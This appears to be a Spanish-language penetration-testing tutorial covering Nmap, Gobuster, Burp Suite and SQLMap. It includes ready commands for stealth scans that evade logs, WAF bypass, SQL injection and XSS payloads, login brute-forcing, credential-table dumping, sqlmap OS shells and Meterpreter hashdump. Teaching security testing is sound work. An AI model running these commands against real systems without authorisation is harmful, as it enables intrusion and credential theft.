Reconocimiento y Enumeration

Descubre hosts, puertos, servicios y tecnologías del objetivo.

Nmap

Escáner de redes

El escáner de redes y puertos más popular del mundo. Esencial para cualquier pentest.

Ping sweep Port scanning Service detection OS fingerprinting NSE scripts
Comandos Comunes
# Escaneo rápido de puertos comunes
nmap target.com

# Escaneo completo con versiones y scripts
nmap -sV -sC -O -p- target.com

# Escaneo stealth (SYN scan)
nmap -sS -T2 -Pn target.com

# Scripts de vulnerabilidad
nmap --script=vuln -p 80,443,8080 target.com

# Output organizado
nmap -oA resultado target.com
Gratis / Pre-instalado en Kali nmap.org

Gobuster

Directory Bruteforcing

Descubre directorios, archivos y subdominios ocultos en servidores web.

Directory mode DNS mode VHost mode Fuzzing

Flujo de Trabajo: Pentest Completo

Cómo encadenar todas las herramientas en un pentest real, paso a paso.

Flujo de 6 Fases

1
Reconocimiento Pasivo (OSINT): Sin tocar el target. subfinder -d target.com -o subs.txt && theHarvester -d target.com -b google
2
Escaneo Activo: Descubrir puertos/servicios. nmap -sV -sC -p- -oA scan target.com
3
Enumeración Web: Directorios y tecnología. gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
4
Análisis de Vulnerabilidades: Buscar flaws. nmap --script=vuln target.com + manual con Burp Suite
5
Explotación: Explotar vulnerabilidades. sqlmap -u "http://target.com/page?id=1" --dbs --batch o Metasploit
6
Post-Explotación: Escalar privilegios y documentar. Meterpreter → getsystem → hashdump

Guía Profesional: Nmap

Domina el escáner de redes más poderoso del mundo con estos escenarios reales.

Escaneo Básico → Avanzado

1
Descubrir hosts vivos: nmap -sn 192.168.1.0/24 — Encuentra todos los dispositivos en tu red.
2
Escaneo rápido: nmap -T4 target.com — Los 1000 puertos comunes.
3
Todos los puertos: nmap -p- -T4 target.com — Los 65,535 puertos.
4
Detectar versiones: nmap -sV -sC target.com — Versión exacta de cada servicio.
5
Detectar SO: nmap -O target.com — Fingerprinting del sistema operativo.
6
Scripts de vulnerabilidad: nmap --script=vuln target.com — Detección automática.
Escenarios Reales
# ESCENARIO 1: Pentest web rápido
nmap -sV -sC -p 80,443,8080,8443 target.com

# ESCENARIO 2: Red interna completa
nmap -sV -sC -O -p- --min-rate=5000 -oA full_internal 10.0.0.0/24

# ESCENARIO 3: Stealth (SYN scan) — evita logs
nmap -sS -T1 -Pn --randomize-hosts target.com

# ESCENARIO 4: Buscar MySQL abierto a internet
nmap -p 3306 --script mysql-info -iL targets.txt

# ESCENARIO 5: Escaneo de vulnerabilidades específico
nmap --script=smb-vuln-ms17-010,http-vuln-cve2021-44228 -p 445,80 target.com

# ESCENARIO 6: Output para reporte
nmap -sV -sC -oX report.xml -oN report.txt target.com

Guía Profesional: Burp Suite

El arsenal completo para testing de aplicaciones web.

Setup y Flujo de Trabajo

1
Instalar: Descarga desde portswigger.net/burp/community. Es gratis la versión Community.
2
Configurar proxy: En el navegador, configura proxy a 127.0.0.1:8080. Instala el CA certificate de Burp para HTTPS.
3
Interceptar requests: Proxy → Intercept → ON. Navega por la web objetivo y Burp captura cada request.
4
Repeater: Envía requests modificadas manualmente. Cambia parámetros, headers, cookies. Observa las respuestas.
5
Intruder: Automatiza fuzzing. Positions: marca los parámetros. Payloads: listas de inyección SQL, XSS, etc.
6
Comparer: Compara respuestas para detectar diferencias (useful para blind SQLi).
Escenarios Reales con Burp
# ESCENARIO 1: Testear un login por fuerza bruta
# 1. Capturar request de login en Proxy
# 2. Send to Intruder (Ctrl+I)
# 3. Positions: marcar el campo password con §
# 4. Payloads: load wordlist (rockyou.txt o ceclib)
# 5. Start attack → ordenar por longitud de respuesta

# ESCENARIO 2: Buscar SQL Injection manual
# 1. En Repeater, enviar: GET /page?id=1' HTTP/1.1
# 2. Si error de SQL → vulnerable
# 3. Probar: id=1' OR '1'='1
# 4. Probar: id=1' ORDER BY 10--
# 5. Probar: id=1' UNION SELECT NULL,NULL,NULL--

# ESCENARIO 3: XSS Stored
# 1. En Repeater, enviar comment con: <script>alert(1)</script>
# 2. Verificar si se almacena sin sanitizar
# 3. Probar bypass: <img src=x onerror=alert(1)>

# ESCENARIO 4: IDOR
# 1. Capturar request GET /api/user/123
# 2. Cambiar a /api/user/124, /api/user/125
# 3. Si ves datos de otro usuario → IDOR

Guía Profesional: SQLMap

Automatiza la detección y explotación de inyecciones SQL como un profesional.

Flujo de Explotación SQLi

1
Detección: sqlmap -u "http://target.com/page?id=1" — SQLMap detecta automáticamente el tipo de inyección.
2
Bases de datos: sqlmap -u "..." --dbs — Lista todas las bases de datos del servidor.
3
Tablas: sqlmap -u "..." -D dbname --tables — Lista tablas de una BD específica.
4
Datos: sqlmap -u "..." -D dbname -T users --dump — Extrae todos los datos de una tabla.
5
Shell: sqlmap -u "..." --os-shell — Si tiene permisos de escritura, obtienes una shell del servidor.
Escenarios Reales
# ESCENARIO 1: URL con parámetro GET
sqlmap -u "http://target.com/page?id=1" --dbs --batch

# ESCENARIO 2: Login con POST
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --dbs --batch

# ESCENARIO 3: Cookie vulnerable
sqlmap -u "http://target.com/dashboard" --cookie="session_id=*" --dbs --batch

# ESCENARIO 4: Bypass WAF
sqlmap -u "http://target.com/?id=1" --tamper=space2comment,randomcase --batch

# ESCENARIO 5: SQLi con headers personalizados
sqlmap -u "http://target.com/api" --headers="X-Forwarded-For: *" --dbs

# ESCENARIO 6: Extraer hashes de contraseñas
sqlmap -u "http://target.com/?id=1" -D users -T credentials --dump --batch
